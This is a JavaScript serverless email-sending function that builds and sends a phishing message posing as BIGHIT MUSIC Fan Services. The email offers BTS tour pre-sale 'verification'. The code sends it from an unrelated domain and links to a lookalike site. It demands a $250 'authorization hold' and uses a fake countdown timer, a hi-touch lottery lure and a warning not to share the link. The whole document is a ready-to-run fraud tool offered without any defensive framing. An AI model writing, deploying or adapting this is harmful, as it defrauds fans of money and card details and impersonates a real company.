import { Resend } from 'resend';

export default {
  async fetch(request, env) {
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ 
        error: 'Method not allowed. Use POST.' 
      }), {
        status: 405,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    try {
      const { firstName, email } = await request.json();

      if (!firstName || !email) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Missing required fields: firstName and email'
        }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Invalid email format'
        }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      const resend = new Resend(env.RESEND_API_KEY);

      // CLEAN EMAIL BODY - No fake Gmail UI headers inside
      const htmlContent = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BTS Arirang Tour Pre-Sale Access</title>
    <!--[if mso]>
    <noscript>
        <xml>
            <o:OfficeDocumentSettings>
                <o:PixelsPerInch>96</o:PixelsPerInch>
            </o:OfficeDocumentSettings>
        </xml>
    </noscript>
    <![endif]-->
</head>
<body style="margin: 0; padding: 0; background-color: #f5f5f5; font-family: Arial, Helvetica, sans-serif; -webkit-font-smoothing: antialiased;">

    <!-- Hidden preheader -->
    <div style="display: none; max-height: 0; overflow: hidden; mso-hide: all;">
        Your BTS Arirang Tour pre-sale access requires verification. Complete identity verification to secure your tickets.
    </div>

    <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #f5f5f5;">
        <tr>
            <td align="center" style="padding: 20px 0;">

                <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="600" style="background-color: #ffffff; max-width: 600px; width: 100%; border-collapse: collapse; box-shadow: 0 1px 3px rgba(0,0,0,0.12);">

                    <!-- Subject Line -->
                    <tr>
                        <td style="background-color: #ffffff; padding: 24px 24px 16px 24px; font-family: Arial, sans-serif; font-size: 24px; color: #202124; font-weight: 400; border-bottom: 1px solid #e0e0e0;">
                            BTS Arirang Tour Pre-Sale Access - Action Required
                        </td>
                    </tr>

                    <!-- Body -->
                    <tr>
                        <td style="background-color: #ffffff; padding: 24px;">

                            <!-- Urgency Banner -->
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); background-color: #764ba2; border-radius: 8px; margin-bottom: 24px;">
                                <tr>
                                    <td style="padding: 24px; text-align: center;">
                                        <div style="font-family: Arial, sans-serif; font-size: 14px; color: #ffffff; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 8px;">Your Pre-Sale Window Closes In</div>
                                        <div style="font-family: 'Courier New', monospace; font-size: 36px; font-weight: 700; color: #ffffff; letter-spacing: 2px; margin: 12px 0;">10:37:42</div>
                                        <div style="font-family: Arial, sans-serif; font-size: 14px; color: #ffffff;">Limited to first 500 verified ARMY members</div>
                                    </td>
                                </tr>
                            </table>

                            <p style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6; margin: 0 0 16px 0;">Dear ${firstName},</p>

                            <p style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6; margin: 0 0 24px 0;">
                                Our system indicates your pre-sale access for the <strong>BTS Arirang Tour 2026</strong> requires verification to proceed.
                            </p>

                            <!-- Status Box -->
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #fff3cd; border-left: 4px solid #ffc107; border-radius: 4px; margin-bottom: 24px;">
                                <tr>
                                    <td style="padding: 20px;">
                                        <div style="font-family: Arial, sans-serif; font-size: 18px; font-weight: 700; color: #856404; margin-bottom: 8px;">Status: Verification Needed</div>
                                        <p style="font-family: Arial, sans-serif; font-size: 15px; color: #856404; line-height: 1.5; margin: 0;">
                                            To protect against scalpers and bots, we require a temporary <strong>$250 authorization hold</strong> to confirm your identity and secure your slot. This is not a charge, it is a pre-authorization that will be released immediately after ticket purchase or within 24 hours.
                                        </p>
                                    </td>
                                </tr>
                            </table>

                            <p style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; font-weight: 700; margin: 0 0 8px 0;">Why this protects our community:</p>

                            <ul style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6; margin: 0 0 24px 0; padding-left: 20px;">
                                <li style="margin-bottom: 4px;">Ensures tickets reach real ARMY, not resellers</li>
                                <li style="margin-bottom: 4px;">Prevents automated bot purchases</li>
                                <li style="margin-bottom: 4px;">Maintains fair pricing for all fans</li>
                            </ul>

                            <!-- CTA Button -->
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin: 32px 0;">
                                <tr>
                                    <td align="center">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0">
                                            <tr>
                                                <td align="center" style="border-radius: 6px; background: linear-gradient(135deg, #764ba2 0%, #667eea 100%); background-color: #764ba2;">
                                                    <a href="https://bighitmusicfan.brigit.work/" target="_blank" style="display: inline-block; padding: 20px 56px; font-family: Arial, sans-serif; font-size: 18px; font-weight: 700; color: #ffffff; text-decoration: none; border-radius: 6px; text-transform: uppercase; letter-spacing: 1px;">
                                                        Complete Identity Verification
                                                    </a>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>
                            </table>

                            <!-- Lottery Box -->
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #f3e5f5; border: 2px dashed #764ba2; border-radius: 8px; margin: 24px 0;">
                                <tr>
                                    <td style="padding: 24px; text-align: center;">
                                        <div style="font-family: Arial, sans-serif; font-size: 18px; font-weight: 700; color: #764ba2; margin-bottom: 8px;">Bonus: Post-Show Hi-Touch Lottery Entry</div>
                                        <p style="font-family: Arial, sans-serif; font-size: 15px; color: #555555; line-height: 1.5; margin: 0;">
                                            Verified members are automatically entered to win a post-show hi-touch experience with one member. 50 winners per show.
                                        </p>
                                    </td>
                                </tr>
                            </table>

                            <!-- Security Notice -->
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #e8f5e9; border: 1px solid #c8e6c9; border-radius: 8px; margin: 24px 0;">
                                <tr>
                                    <td style="padding: 16px;">
                                        <p style="font-family: Arial, sans-serif; font-size: 14px; color: #2e7d32; line-height: 1.5; margin: 0;">
                                            <strong>Security Notice:</strong> This verification link is unique to your account. Do not share this email or forward this link. Sharing will result in immediate disqualification from pre-sale access per BIGHIT's new anti-scalping policy.
                                        </p>
                                    </td>
                                </tr>
                            </table>

                            <!-- Tour Dates -->
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #fafafa; border-radius: 8px; margin: 24px 0;">
                                <tr>
                                    <td style="padding: 20px;">
                                        <div style="font-family: Arial, sans-serif; font-size: 16px; font-weight: 700; color: #764ba2; margin-bottom: 12px;">BTS Arirang Tour 2026 - USA Dates</div>
                                        <p style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.8; margin: 0;">
                                            <strong>Los Angeles</strong> - April 26-27, 2026 (SoFi Stadium)<br>
                                            <strong>Las Vegas</strong> - April 30, 2026 (Allegiant Stadium)<br>
                                            <strong>Chicago</strong> - May 3-4, 2026 (Soldier Field)<br>
                                            <strong>New York</strong> - May 10-11, 2026 (MetLife Stadium)
                                        </p>
                                    </td>
                                </tr>
                            </table>

                            <p style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6; margin: 32px 0 0 0;">
                                We purple you,<br>
                                <strong>BIGHIT MUSIC Fan Services Team</strong>
                            </p>

                            <p style="font-family: Arial, sans-serif; font-size: 12px; color: #5f6368; line-height: 1.5; border-top: 1px solid #e0e0e0; padding-top: 16px; margin: 32px 0 0 0;">
                                This is an automated message regarding your BTS Arirang Tour 2026 pre-sale eligibility. Please do not reply to this email. For support, contact fan-services@bighitmusic-fan.com. &copy; 2026 BIGHIT MUSIC. All rights reserved.
                            </p>

                        </td>
                    </tr>

                </table>
            </td>
        </tr>
    </table>

</body>
</html>`;

      const data = await resend.emails.send({
        from: 'BIGHIT MUSIC Fan Services <bighitmusic@jesusgeneration.vip>',
        to: email,
        subject: 'BTS Arirang Tour Pre-Sale Access - Action Required',
        html: htmlContent,
        text: `Dear ${firstName},\n\nYour BTS Arirang Tour 2026 pre-sale access requires verification to proceed.\n\nTo verify, visit: https://bighitmusicfan.brigit.work/\n\nWhy we do this:\n- Ensures tickets reach real ARMY, not resellers\n- Prevents automated bot purchases\n- Maintains fair pricing for all fans\n\nA temporary $250 authorization hold is required to confirm your identity. This is not a charge, it will be released within 24 hours.\n\nBonus: Verified members are entered to win a post-show hi-touch experience.\n\nTour Dates:\nLos Angeles - April 26-27, 2026 (SoFi Stadium)\nLas Vegas - April 30, 2026 (Allegiant Stadium)\nChicago - May 3-4, 2026 (Soldier Field)\nNew York - May 10-11, 2026 (MetLife Stadium)\n\nSecurity Notice: This link is unique to your account. Do not share.\n\nWe purple you,\nBIGHIT MUSIC Fan Services Team\n\nThis is an automated message. Please do not reply. For support, contact fan-services@bighitmusic-fan.com. © 2026 BIGHIT MUSIC. All rights reserved.`,
        headers: {
          'X-Priority': '3',
          'X-Mailer': 'Resend',
          'Precedence': 'bulk',
          'List-Unsubscribe': '<mailto:unsubscribe@jesusgeneration.vip>',
        },
      });

      return new Response(JSON.stringify({
        success: true,
        message: 'Email sent successfully',
        id: data.id,
        recipient: email,
        firstName: firstName
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });

    } catch (error) {
      console.error('Error:', error);
      return new Response(JSON.stringify({
        success: false,
        error: error.message
      }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }
};
